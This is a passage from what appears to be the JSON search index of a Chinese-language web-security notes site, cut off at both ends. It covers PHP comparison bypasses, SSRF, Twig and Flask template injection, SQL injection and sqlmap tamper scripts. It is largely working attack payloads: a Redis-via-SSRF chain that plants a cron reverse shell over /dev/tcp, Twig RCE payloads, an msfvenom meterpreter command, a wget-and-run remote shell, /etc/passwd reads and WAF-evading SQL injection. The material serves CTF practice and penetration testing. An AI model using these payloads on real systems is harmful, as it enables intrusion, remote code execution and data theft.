\u0026#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab\u0026#34; $s3 = \u0026#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab\u0026#34; payload: /?a=$s1\u0026amp;b=$s2\nstrcmp 弱比较（==）的绕过 # \u0026lt;?php if(strcmp($_GET[\u0026#39;a\u0026#39;],file_get_contents(\u0026#34;/flag\u0026#34;)) == 0){ echo \u0026#34;flag\u0026#34;; } strcmp() 函数是用来比较两个字符串的大小，若两个字符串相等则返回 0。这里的绕过方法是给 a 传入数组，这样 strcmp() 函数会返回 NULL，而 NULL==0 为 true。\npayload: /?a[]=1\nis_numeric 字符串/数字绕过 # if(!is_numeric($_GET[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;a\u0026#39;] \u0026gt; 2023){ echo \u0026#34;flag\u0026#34;; } payload: /?a=2024abc\n正则匹配绕过 # 例题 # extract($_POST); //extract() 函数用于将数组中的元素转化为变量，若数组中的元素是字符串，则会将字符串的内容作为变量名，变量值为 NULL。 foreach($_POST as $var){ if(preg_match(\u0026#34;/[a-zA-Z0-9]/\u0026#34;,$var)){ die(\u0026#34;nope\u0026#34;); } } echo \u0026#34;flag\u0026#34;; exp:\ndef encode(letter): str = \u0026#34;~`!\\\u0026#34;@#$%\u0026amp;\u0026#39;\\\\*()-=+_[]{};:\u0026lt;\u0026gt;,.?/|\u0026#34; for i in range(0, len(str)): for j in range(0, len(str)): a = ord(str[i])^ord(str[j]) if chr(a) == letter: return \u0026#34;(\\\u0026#34;\u0026#34;+str[i]+\u0026#34;\\\u0026#34;^\\\u0026#34;\u0026#34;+str[j]+\u0026#34;\\\u0026#34;).\u0026#34; return letter string = \u0026#34;flag5\u0026#34; payload = \u0026#34;\u0026#34; for i in string: payload += encode(i) print(payload) "},{"id":42,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/%E6%97%A0%E5%8F%82%E6%95%B0RCE/","title":"无参数 Rce","section":"Docs","content":" 无参数RCE # https://blog.csdn.net/Manuffer/article/details/120738755\n"},{"id":43,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSRF/","title":"Ssrf","section":"Docs","content":" SSRF # 伪协议 # https://www.sqlsec.com/2021/05/ssrf.html\nfile:// # 从文件系统中获取文件内容\ndict:// # 字典服务协议，访问字典资源，如dict:///ip:6739/info（Redis命令执行）\n可用于端口扫描\ngopher:// # 分布式文档传递服务\nftp:// # 可用于网络端口扫描，响应时间长的端口可能是开放的，但是扫描速度太慢\nsftp:// # SSH文件传输协议\nldap:// # 轻量级目录访问协议\ntftp:// # 简单文件传输协议\n获取本地信息 # 读取passwd：file:///etc/passwd 本机IP：file:///etc/hosts arp缓存表：file:///proc/net/arp 可以通过http等访问批量ip，再查看arp缓存表，实现内网扫描 网段路由信息：file:///proc/net/fib_trie 探测内网端口 # SSRF 常配合 DICT 协议探测内网端口开放情况，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口\n通过Burpsuite的Intruder\n通过 SSRF 进行 XXE 攻击 # 先来抓取正常情况下 XXE 攻击的 POST 请求的数据包，删除掉 Accept-Encoding 这一行，然后使用 Burpsuite 对 POST 数据包进行两次 URL 编码\nhttps://www.sqlsec.com/2021/05/ssrf.html#172-72-23-25-XML-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5\nCVE-2017-12615 # Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞\nhttps://www.sqlsec.com/2021/05/ssrf.html#172-72-23-26-CVE-2017-12615\nRedis 未授权 # dict://x.x.x.x:6379/\u0026lt;Redis 命令\u0026gt;\n# 清空 key dict://172.72.23.27:6379/flushall # 设置要操作的路径为定时任务目录 dict://172.72.23.27:6379/config set dir /var/spool/cron/ # 在定时任务目录下创建 root 的定时任务文件 dict://172.72.23.27:6379/config set dbfilename root # 写入 Bash 反弹 shell 的 payload dict://172.72.23.27:6379/set x \u0026#34;\\n* * * * * /bin/bash -i \u0026gt;%26 /dev/tcp/x.x.x.x/2333 0\u0026gt;%261\\n\u0026#34; # 保存上述操作 dict://172.72.23.27:6379/save SSRF 传递的时候记得要把 \u0026amp; URL 编码为 %26，上面的操作最好再 BP 下抓包操作，防止浏览器传输的时候被 URL 打乱编码\nRedis 有认证 # https://www.sqlsec.com/2021/05/ssrf.html#172-72-23-28-Redis-%E6%9C%89%E8%AE%A4%E8%AF%81\nMySQL 未授权 # https://www.sqlsec.com/2021/05/ssrf.html#SSRF-%E4%B9%8B-MySQL-%E6%9C%AA%E6%8E%88%E6%9D%83\n"},{"id":44,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSTI/PHP-Twig/","title":"Php Twig","section":"Docs","content":" PHP-Twig 模板注入 # Twig 是来自于 Symfony 的模板引擎，它非常易于安装和使用。它的操作有点像 Mustache 和 liquid。\n\u0026lt;?php require_once dirname(__FILE__).\u0026#39;\\twig\\lib\\Twig\\Autoloader.php\u0026#39;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-\u0026gt;render(\u0026#34;Hello {{name}}\u0026#34;, array(\u0026#34;name\u0026#34; =\u0026gt; $_GET[\u0026#34;name\u0026#34;])); // 将用户输入作为模版变量的值 echo $output; ?\u0026gt; Twig 使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。\n其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。\n使用 Twig 模版引擎渲染页面，其中模版含有 {{name}} 变量，其模版变量值来自于 GET 请求参数 $_GET[\u0026quot;name\u0026quot;] 。\n显然这段代码并没有什么问题，即使你想通过 name 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击： 但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：\n\u0026lt;?php require_once dirname(__FILE__).\u0026#39;/../lib/Twig/Autoloader.php\u0026#39;; Twig_Autoloader::register(true); $twig=newTwig_Environment(newTwig_Loader_String()); $output=$twig-\u0026gt;render(\u0026#34;Hello {$_GET[\u0026#39;name\u0026#39;]}\u0026#34;);// 将用户输入作为模版内容的一部分 echo $output;?\u0026gt; 上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见： 如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。\n在 Twig 模板引擎里，{{var}} 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。\n例如这里用户输入 name=`{{2*10}} ，则在服务端拼接的模版内容为： 尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为： bmjoker{# comment #}{{2*8}}OK 实际服务端要进行编译的模板就被构造为： bmjoker{# comment #}{{2*8}}OK 由于 {# comment #} 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 {{2*8}} 作为模板变量最终会返回 16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK\n通过上面两个简单的示例，就能得到 SSTI 扫描检测的大致流程（这里以 Twig 为例）:\n同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。\n每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。\n简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。\n凡是使用模板的网站，基本都会存在 SSTI，只是能否控制其传参而已。\n接下来借助 XVWA 的代码来实践演示一下 SSTI 注入\n如果在 web 页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据\n\u0026lt;div\u0026gt;{$what}\u0026lt;/div\u0026gt; \u0026lt;p\u0026gt;Welcome, {{username}}\u0026lt;/p\u0026gt; \u0026lt;div\u0026gt;{%$a%}\u0026lt;/div\u0026gt; ... 通过注入了探测字符串 ${{123+456}}，以查看应用程序是否进行了相应的计算：\n根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于 {{ }} 的处理方式\n在这里提供一个针对 twig 的攻击载荷：\n{{_self.env.registerUndefinedFilterCallback(\u0026quot;exec\u0026quot;)}}{{_self.env.getFilter(\u0026quot;id\u0026quot;)}}\n使用 msf 生成了一个 php meterpreter 有效载荷\nmsfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 \u0026gt; /var/www/html/shell.txt msf 进行监听：\n模板注入远程下载 shell，并重命名运行\n{{_self.env.registerUndefinedFilterCallback(\u0026quot;exec\u0026quot;)}}{{_self.env.getFilter(\u0026quot;wget \u0026lt;http://192.168.127.131/shell.txt\u0026gt; -O /tmp/shell.php;php -f /tmp/shell.php\u0026quot;)}}\n以上就是 php twig 模板注入，由于以上使用的 twig 为 2.x 版本，现在官方已经更新到 3.x 版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的 payload：\n{{\u0026#39;/etc/passwd\u0026#39;|file_excerpt(1,30)}} {{app.request.files.get(1).__construct(\u0026#39;/etc/passwd\u0026#39;,\u0026#39;\u0026#39;)}} {{app.request.files.get(1).openFile.fread(99)}} {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;whoami\u0026#34;)}} {{_self.env.enableDebug()}}{{_self.env.isDebug()}} {{[\u0026#34;id\u0026#34;]|map(\u0026#34;system\u0026#34;)|join(\u0026#34;,\u0026#34;) {{{\u0026#34;\u0026lt;?php phpinfo();\u0026#34;:\u0026#34;/var/www/html/shell.php\u0026#34;}|map(\u0026#34;file_put_contents\u0026#34;)}} {{[\u0026#34;id\u0026#34;,0]|sort(\u0026#34;system\u0026#34;)|join(\u0026#34;,\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|filter(\u0026#34;system\u0026#34;)|join(\u0026#34;,\u0026#34;)}} {{[0,0]|reduce(\u0026#34;system\u0026#34;,\u0026#34;id\u0026#34;)|join(\u0026#34;,\u0026#34;)}} {{[\u0026#39;cat /etc/passwd\u0026#39;]|filter(\u0026#39;system\u0026#39;)}} 具体 payload 分析详见：《TWIG 全版本通用 SSTI payloads》\n"},{"id":45,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSTI/SSTI/","title":"Ssti","section":"Docs","content":" SSTI # https://blog.csdn.net/solitudi/article/details/107752717\n判断模板类型 # ${7*7} 执行 a{*comment*}b 执行 Smarty 不执行 ${\u0026quot;z\u0026quot;.join(\u0026quot;ab\u0026quot;)} 执行 Mako 不执行 Unknown 不执行 {{7*7}} 执行 {{7*'7}'} 执行 Jinja2 Twig 不执行 Unkown 不执行 Not Vulnerable Flask # Flask 模板注入漏洞是一种安全漏洞，它涉及到使用 Flask 框架的 Web 应用程序中的模板引擎，通常是 Jinja2。这种漏洞允许攻击者通过精心构造的输入来注入恶意模板代码，从而可能导致潜在的安全问题，例如数据泄露、远程代码执行等。这是一种典型的服务器端模板注入（Server-Side Template Injection，SSTI）漏洞。\nFlask 模板注入漏洞通常发生在以下情况下：\n用户输入不经过充分验证或过滤，被动态插入到模板中。这可以发生在应用程序中，例如在用户提交的表单数据中，应用程序将用户输入作为变量插入到模板中，而没有适当的过滤和转义。\n攻击者能够控制输入并在其中插入模板标记。这可以发生在应用程序的 URL 参数、Cookie 或其他请求参数中，如果这些输入没有得到正确的验证和处理。\n不安全的模板渲染设置。应用程序配置或使用不安全的模板渲染设置，使得攻击者可以注入自己的模板代码。\n以下是一个简单的示例，说明 Flask 模板注入漏洞的工作原理：\nfrom flask import Flask, render_template, request app = Flask(__name__) @app.route(\u0026#39;/hello\u0026#39;) def hello(): name = request.args.get(\u0026#39;name\u0026#39;) return render_template(\u0026#39;hello.html\u0026#39;, name=name) if __name__ == \u0026#39;__main__\u0026#39;: app.run() 在上述示例中，name 参数的值被插入到 hello.html 模板中，但如果没有进行适当的输入验证和过滤，攻击者可以构造恶意输入，例如?name={{7*7}}，这将导致模板注入漏洞，执行7*7并显示结果49。\nPHP-Twig # https://xz.aliyun.com/t/10056\n"},{"id":46,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/WordPress/","title":"Word Press","section":"Docs","content":" WordPress安全 # WPScan # https://github.com/wpscanteam/wpscan\n"},{"id":47,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","title":"信息泄露","section":"Docs","content":" 信息泄露 # robots.txt # 源码泄露 # https://blog.csdn.net/wy_97/article/details/78165051\n.hg 泄露（Mercurial 版本控制） # .git 泄露（git 版本控制） # .DS_Store 文件泄漏（Mac Os 保存目录里面所有文件的清单） # .svn 泄露（Subversion 版本控制） # CVS 泄漏（CVS 版本控制） # Bazaar/bzr 泄露（bzr 版本控制） # WEB-INF/web.xml（java） # 网站备份压缩文件 # .swp 泄露（临时文件） # "},{"id":48,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/","title":"命令执行绕过","section":"Docs","content":" 命令执行绕过 # https://blog.csdn.net/qq_41315957/article/details/118855865\n"},{"id":49,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/NoSQLi/","title":"No Sqli","section":"Docs","content":" NoSQL注入 # NoSQL(NOT ONLY SQL)，它和我们常见的sql注入很像。\n它的危害有：\n绕过身份验证或保护机制。 提取或编辑数据。 导致拒绝服务。 在服务器上执行代码。 其实注入的本质都是一样的，只是语法有些不一样。\n"},{"id":50,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/SQLi/","title":"Sqli","section":"Docs","content":" SQL注入 # 报错注入 # 产生报错的函数：\nextractvalue()\nextractvalue(1, concat(0x7e, (select @@version), 0x7e)) updatexml()\nupdatexml(1, concat(0x7e, (select @@version), 0x7e), 1) "},{"id":51,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/SQLi%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/","title":"Sqli过滤绕过","section":"Docs","content":" SQLi过滤绕过 # and, or 过滤 # 大小写绕过\n复写绕过\n\u0026amp;\u0026amp;, || 绕过\n用 \u0026amp;\u0026amp; 和 || 代替 and 和 or\n提交的时候要使用URL编码\n空格过滤 # 只用括号\n+ 代替空格\n很多时候被当作连接符或运算符，而不是空格\nURL编码代替空格 符号 URL编码 spaces %20 tab %09 LF OA new line %0a FF 0C new page %0c CR 0D carriage return %0d VT 0B vertical tab %0b -OA- (MySQL Only) %a0 逗号过滤 # join绕过\nunion select 1,2,3 --等于↓ union select * from (select 1)a join (select 2)b join (select 3)c union和select过滤 # 复写、大小写、/**/\nmysql8版本的table绕过\nhttps://www.freebuf.com/articles/web/275528.html\naddslashes过滤 # 宽字节注入（局限性：数据库使用GBK编码）\n如输入%df'，转义后为\u0026lt;0xdf\u0026gt;\\'，数据库会认为是\u0026lt;0xdf0x5c\u0026gt;'，0xdf0x5c组成一个汉字運\n其他WAF绕过手段 # 注释\n/*xxx*/：不执行 /*!xxx*/：执行 /*!90000xxx*/：不执行 换行\nWAF单行匹配，通过换行分开词组，如union select -\u0026gt; union --+b%0a select 超大数据包绕过\nPOST分段传输\n"},{"id":52,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sqlmap%E8%84%9A%E6%9C%AC/","title":"Sqlmap脚本","section":"Docs","content":" 常用脚本 # 用法: 添加参数 --tamper \u0026quot;scriptname\u0026quot;\n绕过空格检测 # space2plus.py # 适用数据库：ALL\n作用：用加号替换空格\n使用脚本前：tamper('SELECT id FROM users')\n使用脚本后：SELECT+id+FROM+users\nmultiplespaces.py # 适用数据库：ALL\n作用：围绕 sql 关键字添加多个空格\n使用脚本前：tamper('1 UNION SELECT foobar')\n使用脚本后：1 UNION SELECT foobar\nspace2randomblank.py # 适用数据库：ALL\n作用：将空格替换为其他有效字符\n使用脚本前：tamper('SELECT id FROM users')\n使用脚本后：SELECT%0Did%0DFROM%0Ausers\nspace2dash.py # 适用数据库：ALL\n作用：将空格替换为--，并添加一个随机字符串和换行符\n使用脚本前：tamper('1 AND 9227=9227')\n使用脚本后：1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227\nspace2mysqldash.py # 适用数据库：MySQL、MSSQL\n作用：将空格替换为 -- ，并追随一个换行符\n使用脚本前：tamper('1 AND 9227=9227')\n使用脚本后：1--%0AAND--%0A9227=9227\nspace2hash.py # 适用数据库：ALL\n作用：pounds comment character “#” followed by a linefeed a random string of characters and replace the space character\nspace2morehash.py # 适用数据库：MySQL \u0026gt;= 5.1.13\n测试通过数据库：MySQL 5.1.41\n作用：将空格替换为#，并添加一个随机字符串和换行符\n使用脚本前：tamper('1 AND 9227=9227')\n使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227\nspace2mssqlhash.py # 适用数据库：Microsoft SQL Server\n作用：pounds comment symbol “#” followed by a space character to replace newline\nspace2mysqlblank.py # 适用数据库：MySQL\n测试通过数据库：MySQL 5.1\n作用：将空格替换为其他空格符号('%09', '%0A', '%0C', '%0D', '%0B')\n使用脚本前：tamper('SELECT id FROM users')\n使用脚本后：SELECT%0Bid%0DFROM%0Cusers\nspace2mssqlblank.py # 适用数据库：Microsoft SQL Server\n测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005\n作用：将空格随机替换为其他空格符号('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')\n使用脚本前：tamper('SELECT id FROM users')\n使用脚本后：SELECT%0Eid%0DFROM%07users\nspace2comment.py # 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0\n作用：将空格替换为/**/\n使用脚本前：tamper('SELECT id FROM users')\n使用脚本后：SELECT/**/id/**/FROM/**/users\n绕过关键字检测 # randomcase.py # 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0\n作用：随机大小写\n使用脚本前：tamper('INSERT')\n使用脚本后：INseRt\nversionedkeywords.py # 适用数据库：MySQL\n测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11\n作用：注释绕过\n使用脚本前：tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')\n使用脚本后：1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#\nhalfversionedmorekeywords.py # 适用数据库：MySQL \u0026lt; 5.1\n测试通过数据库：MySQL 4.0.18/5.0.22\n作用：在每个关键字前添加 mysql 版本注释\n使用脚本前：tamper(\u0026quot;value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa\u0026quot;)\n使用脚本后：value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa\nrandomcomments.py # 适用数据库：ALL\n作用：用注释符分割 sql 关键字\n使用脚本前：tamper('INSERT')\n使用脚本后：I/**/N/**/SERT\nifnull2ifisnull.py # 适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)\n测试通过数据库：MySQL 5.0 and 5.5\n作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤\n使用脚本前：tamper('IFNULL(1, 2)')\n使用脚本后：IF(ISNULL(1),2,1)\npercentage.py # 适用数据库：ASP\n测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0\n作用：在每个字符前添加一个%\n使用脚本前：tamper('SELECT FIELD FROM TABLE')\n使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E\n绕过符号检测 # apostrophemask.py # 适用数据库：ALL\n作用：将引号替换为 utf-8，用于过滤单引号\n使用脚本前：tamper(\u0026quot;1 AND '1'='1\u0026quot;)\n使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871\nbetween.py # 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0\n作用：用NOT BETWEEN 0 AND #替换\u0026gt;\n使用脚本前：tamper('1 AND A \u0026gt; B--')\n使用脚本后：1 AND A NOT BETWEEN 0 AND B--\ngreatest.py # 测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0\n作用：将\u0026gt;替换为 GREATEST，绕过对\u0026gt;的过滤\n使用脚本前：tamper('1 AND A \u0026gt; B')\n使用脚本后：1 AND GREATEST(A,B+1)=A\nequaltolike.py # 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5\n作用：将=替换为LIKE\n使用脚本前：tamper('SELECT * FROM users WHERE id=1')\n使用脚本后：SELECT * FROM users WHERE id LIKE 1\nbluecoat.py # 适用数据库：Blue Coat SGOS\n测试通过数据库：MySQL 5.1,、SGOS\n作用：在 sql 语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=\n使用脚本前：tamper('SELECT id FROM users where id = 1')\n使用脚本后：SELECT%09id FROM users where id LIKE 1\nunmagicquotes.py # 适用数据库：ALL\n作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格\n使用脚本前：tamper(\u0026quot;1' AND 1=1\u0026quot;)\n使用脚本后：1%bf%27 AND 1=1--\n其他脚本 # base64encode.py # 适用数据库：ALL\n作用：替换为 base64 编码\n使用脚本前：tamper(\u0026quot;1' AND SLEEP(5)#\u0026quot;)\n使用脚本后：MScgQU5EIFNMRUVQKDUpIw==\nnonrecursivereplacement.py # 适用数据库：ALL\n作用：作为双重查询语句，用双重语句替代预定义的 sql 关键字（适用于非常弱的自定义过滤器，例如将 select 替换为空）\n使用脚本前：tamper('1 UNION SELECT 2--')\n使用脚本后：1 UNIOUNIONN SELESELECTCT 2--\nunionalltounion.py # 适用数据库：ALL\n作用：将union allselect 替换为unionselect\n使用脚本前：tamper('-1 UNION ALL SELECT')\n使用脚本后：-1 UNION SELECT\nsecuresphere.py # 适用数据库：ALL\n作用：追加特定的字符串\n使用脚本前：tamper('1 AND 1=1')\n使用脚本后：1 AND 1=1 and '0having'='0having'\nsp_password.py # 适用数据库：MSSQL\n作用：从 T-SQL 日志的自动迷糊处理的有效载荷中追加 sp_password\n使用脚本前：tamper('1 AND 9227=9227-- ')\n使用脚本后：1 AND 9227=9227-- sp_password\ncharencode.py # 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0\n作用：对给定的 payload 全部字符使用 url 编码（不处理已经编码的字符）\n使用脚本前：tamper('SELECT FIELD FROM%20TABLE')\n使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45\ncharunicodeencode.py # 适用数据库：ASP、ASP.NET\n测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3\n作用：适用字符串的 unicode 编码\n使用脚本前：tamper('SELECT FIELD%20FROM TABLE')\n使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045\nmodsecurityversioned.py # 适用数据库：MySQL\n测试通过数据库：MySQL 5.0\n作用：过滤空格，使用 mysql 内联注释的方式进行注入\n使用脚本前：tamper('1 AND 2\u0026gt;1--')\n使用脚本后：1 /*!30874AND 2\u0026gt;1*/--\nmodsecurityzeroversioned.py # 适用数据库：MySQL\n测试通过数据库：MySQL 5.0\n作用：使用内联注释方式（/*!00000*/）进行注入\n使用脚本前：tamper('1 AND 2\u0026gt;1--')\n使用脚本后：1 /*!00000AND 2\u0026gt;1*/--\napostrophenullencode.py # 适用数据库：ALL\n作用：用非法双字节 